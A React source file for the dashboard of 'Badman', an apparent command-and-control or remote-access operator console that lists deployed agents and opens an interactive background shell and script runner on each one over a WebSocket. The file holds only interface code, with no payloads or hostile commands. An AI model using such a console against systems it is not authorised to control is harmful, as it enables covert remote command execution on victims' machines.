import React, { useState, useEffect, useRef } from 'react';
import api from '../api';
import AgentList from './AgentList';
import Terminal from './Terminal';
import ScriptRunner from './ScriptRunner';

function Dashboard({ token, onLogout }) {
  const [agents, setAgents] = useState([]);
  const [selectedAgent, setSelectedAgent] = useState(null);
  const [activeTab, setActiveTab] = useState('shell');
  const [shellRunning, setShellRunning] = useState(false);
  const wsRef = useRef(null);
  const [wsConnected, setWsConnected] = useState(false);
  const [sidebarOpen, setSidebarOpen] = useState(
    () => localStorage.getItem('rto.sidebar.collapsed') !== '1'
  );
  const [sidebarWidth, setSidebarWidth] = useState(() => {
    const w = parseInt(localStorage.getItem('rto.sidebar.width') || '', 10);
    return Number.isFinite(w) && w >= 220 ? w : 310;
  });
  const sidebarWidthRef = useRef(sidebarWidth);
  const dragState = useRef(null);

  useEffect(() => {
    sidebarWidthRef.current = sidebarWidth;
  }, [sidebarWidth]);

  useEffect(() => {
    // Fetch initial agent list
    api.get('/agents').then((res) => setAgents(res.data)).catch(console.error);

    // Connect WebSocket for operator
    const wsUrl = `${window.location.origin.replace(/^http/, 'ws')}/ws/operator?token=${token}`;
    const ws = new WebSocket(wsUrl);
    wsRef.current = ws;

    ws.onopen = () => setWsConnected(true);
    ws.onclose = () => setWsConnected(false);
    ws.onmessage = (event) => {
      const msg = JSON.parse(event.data);
      if (msg.type === 'agent_status') {
        setAgents((prev) =>
          prev.map((a) =>
            a.id === msg.agent.id ? { ...a, status: msg.agent.status, ...msg.agent } : a
          )
        );
      } else if (msg.type === 'terminal_output' || msg.type === 'script_result') {
        // If we have a callback for output, handle it in child components
        // We'll pass a callback via context or props
        // For simplicity, we'll dispatch a custom event
        window.dispatchEvent(new CustomEvent('agent-message', { detail: msg }));
      }
    };

    return () => ws.close();
  }, [token]);

  const sendToAgent = (message) => {
    if (wsRef.current && wsRef.current.readyState === WebSocket.OPEN) {
      wsRef.current.send(JSON.stringify(message));
    }
  };

  const toggleSidebar = () => {
    setSidebarOpen((prev) => {
      const next = !prev;
      localStorage.setItem('rto.sidebar.collapsed', next ? '0' : '1');
      return next;
    });
  };

  const onResizeMove = (e) => {
    const d = dragState.current;
    if (!d) return;
    const min = 220;
    const max = Math.max(min, Math.floor(window.innerWidth * 0.5));
    const next = Math.min(max, Math.max(min, d.startWidth + (e.clientX - d.startX)));
    setSidebarWidth(next);
  };

  const onResizeEnd = () => {
    dragState.current = null;
    document.body.classList.remove('resizing');
    window.removeEventListener('mousemove', onResizeMove);
    window.removeEventListener('mouseup', onResizeEnd);
    localStorage.setItem('rto.sidebar.width', String(sidebarWidthRef.current));
  };

  const onResizeStart = (e) => {
    e.preventDefault();
    dragState.current = { startX: e.clientX, startWidth: sidebarWidth };
    document.body.classList.add('resizing');
    window.addEventListener('mousemove', onResizeMove);
    window.addEventListener('mouseup', onResizeEnd);
  };

  const onlineCount = agents.filter((a) => a.status === 'online').length;

  return (
    <div className="dashboard">
      <header className="topbar">
        <div className="brand">
          <span className="brand-mark">◈</span>
          <div>
            <h1>Badman</h1>
            <span className="brand-sub">Operator Console</span>
          </div>
        </div>
        <button
          className={`btn-sidebar-toggle ${sidebarOpen ? 'active' : ''}`}
          onClick={toggleSidebar}
          title={sidebarOpen ? 'Hide agent panel' : 'Show agent panel'}
        >
          <svg width="15" height="15" viewBox="0 0 16 16" fill="none" aria-hidden="true">
            <rect x="1.5" y="2.5" width="13" height="11" rx="2" stroke="currentColor" strokeWidth="1.4" />
            <line x1="6.5" y1="2.5" x2="6.5" y2="13.5" stroke="currentColor" strokeWidth="1.4" />
          </svg>
        </button>
        <div className="topbar-stats">
          <div className="stat">
            <span className="stat-label">Agents</span>
            <span className="stat-value">{agents.length}</span>
          </div>
          <div className="stat">
            <span className="stat-label">Online</span>
            <span className="stat-value">{onlineCount}</span>
          </div>
        </div>
        <span className={`conn-pill ${wsConnected ? 'online' : 'offline'}`}>
          <span className="conn-dot" />
          {wsConnected ? 'Link Established' : 'Link Down'}
        </span>
        <button className="btn-logout" onClick={onLogout}>Sign out</button>
      </header>

      <div className="workspace">
        <aside
          className={`sidebar ${sidebarOpen ? '' : 'collapsed'}`}
          style={{ width: sidebarOpen ? sidebarWidth : 0 }}
        >
          <div className="sidebar-head">
            <span>Deployed Agents</span>
            <span className="count-badge">{agents.length}</span>
          </div>
          <AgentList agents={agents} selectedAgent={selectedAgent} onSelect={setSelectedAgent} />
        </aside>
        {sidebarOpen && <div className="sidebar-resizer" onMouseDown={onResizeStart} />}

        <main className="main-panel">
          {selectedAgent ? (
            <div className="tab-area">
              <nav className="tabbar">
                <button
                  className={`tab ${activeTab === 'shell' ? 'active' : ''}`}
                  onClick={() => setActiveTab('shell')}
                >
                  <span className={`tab-dot ${wsConnected ? 'live' : ''}`} />
                  Shell
                </button>
                <button
                  className={`tab ${activeTab === 'scripts' ? 'active' : ''}`}
                  onClick={() => setActiveTab('scripts')}
                >
                  <span className={`tab-dot amber ${wsConnected ? 'live' : ''}`} />
                  Script Runner
                </button>
                <span className="tabbar-meta">
                  {selectedAgent.hostname} · {selectedAgent.ip_address || '0.0.0.0'}
                </span>
              </nav>

              <section className={`panel terminal-panel ${activeTab === 'shell' ? '' : 'hidden'}`}>
                <div className="panel-head">
                  <span className="panel-title">
                    <span className="title-dot" /> Interactive Shell
                  </span>
                  <span className="panel-meta">cmd · {selectedAgent.hostname}</span>
                  <button
                    className={`btn-shell-toggle ${shellRunning ? 'running' : ''}`}
                    onClick={() => setShellRunning((v) => !v)}
                    title={shellRunning ? 'Stop the background shell' : 'Start the background shell'}
                  >
                    <span className="shell-toggle-dot" />
                    {shellRunning ? 'Stop' : 'Start'}
                  </button>
                </div>
                <div className="terminal-body">
                  <Terminal
                    agent={selectedAgent}
                    sendToAgent={sendToAgent}
                    active={activeTab === 'shell'}
                    running={shellRunning}
                  />
                </div>
              </section>

              <section className={`panel script-panel ${activeTab === 'scripts' ? '' : 'hidden'}`}>
                <ScriptRunner agents={selectedAgent ? [selectedAgent] : []} sendToAgent={sendToAgent} />
              </section>
            </div>
          ) : (
            <div className="empty-state">
              <span className="empty-icon">⌁</span>
              <h2>No Agent Selected</h2>
              <p>Select a deployed agent from the left to open a shell and script runner.</p>
            </div>
          )}
        </main>
      </div>
    </div>
  );
}

export default Dashboard;
